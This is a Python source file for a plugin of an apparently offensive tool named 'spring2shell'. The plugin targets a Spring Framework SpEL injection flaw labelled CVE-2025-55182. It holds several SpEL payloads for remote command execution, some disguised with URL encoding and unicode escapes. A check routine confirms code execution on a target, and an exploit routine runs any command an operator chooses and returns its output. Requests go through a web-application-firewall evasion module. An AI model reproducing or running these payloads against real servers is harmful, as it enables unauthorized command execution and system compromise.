"""
Plugin for CVE-2025-55182: Spring Framework SpEL Injection.
"""

from __future__ import annotations

import random
from typing import Any
import requests

from spring2shell.core.reporter import build_finding
from spring2shell.evasion.waf_engine import waf_engine
from spring2shell.plugins.base import BasePlugin
from spring2shell.utils.auth import audit_log, rate_limit_acquire


class CVE_2025_55182_Plugin(BasePlugin):
    """Spring Framework SpEL Injection (CVE-2025-55182) Plugin."""

    name = "cve_2025_55182"
    cve_id = "CVE-2025-55182"
    description = "SpEL Injection variants for Spring Framework — CVE-2025-55182"

    payload_templates = [
        '{"query":"{{#this.getClass().forName(\\"java.lang.Runtime\\").getMethod(\\"getRuntime\\").invoke(null).exec(\\"COMMAND\\")}}"}',
        '{"query":"{{new java.lang.ProcessBuilder(\\"COMMAND\\").start()}}"}',
        '{"query":"{{T(org.springframework.util.StreamUtils).copy(T(java.lang.Runtime).getRuntime().exec(\\"COMMAND\\").getInputStream(),T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream())}}"}',
        '{"query":"{{#this.getClass().forName(\\"javax.script.ScriptEngineManager\\").newInstance().getEngineByName(\\"JavaScript\\").eval(\\\"java.lang.Runtime.getRuntime().exec(\\\\\\\\\\\\\\\"COMMAND\\\\\\\\\\\\\\\")\\\")}}"}',
        '{"query": "{{T(java.lang.Runtime).getRuntime().exec(\\"COMMAND\\")}}"}',
        '{"query": "%7B%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22COMMAND%22%29%7D%7D"}',
        '{"qu\\u0065ry": "{{T(java.lang.Runtime).getRuntime().exec(\\"COMMAND\\")}}"}',
        '{\n\t"query":\n\t"{{T(java.lang.Runtime).getRuntime().exec(\\"COMMAND\\")}}"\n}',
    ]

    def check(
        self,
        session: requests.Session,
        target: str,
        endpoint: str,
        headers: dict[str, str],
    ) -> dict[str, Any] | None:
        marker = f"RCE_{random.randint(100000, 999999)}"
        test_cmd = f"echo {marker}"
        content_types = ["application/json", "application/graphql+json", "text/plain"]

        for payload_template in self.payload_templates:
            payload = payload_template.replace("COMMAND", test_cmd)
            for ct in content_types:
                req_headers = headers.copy()
                req_headers["Content-Type"] = ct
                payload, req_headers = waf_engine.apply(payload, req_headers)

                try:
                    rate_limit_acquire()
                    resp = session.post(endpoint, data=payload, headers=req_headers, timeout=5)
                    audit_log("POST", endpoint, resp.status_code, payload[:100], "cve_scan")

                    if resp.status_code in (200, 400, 500) and marker in resp.text:
                        return build_finding(
                            url=target,
                            endpoint=endpoint,
                            status="confirmed",
                            cve=self.cve_id,
                            confidence="high",
                            reason="CVE_2025_55182_CONFIRMED",
                            evidence=f"Reflected command execution marker '{marker}' in response.",
                            payload=payload,
                            method="POST",
                            status_code=resp.status_code,
                            framework="Spring",
                        )
                except Exception:
                    continue
        return None

    def exploit(
        self,
        session: requests.Session,
        target: str,
        endpoint: str,
        headers: dict[str, str],
        command: str,
    ) -> str | None:
        content_types = ["application/json", "application/graphql+json", "text/plain"]
        for payload_template in self.payload_templates:
            payload = payload_template.replace("COMMAND", command)
            for ct in content_types:
                req_headers = headers.copy()
                req_headers["Content-Type"] = ct
                payload, req_headers = waf_engine.apply(payload, req_headers)

                try:
                    resp = session.post(endpoint, data=payload, headers=req_headers, timeout=8)
                    if resp.status_code in (200, 400, 500) and resp.text:
                        return resp.text
                except Exception:
                    continue
        return None
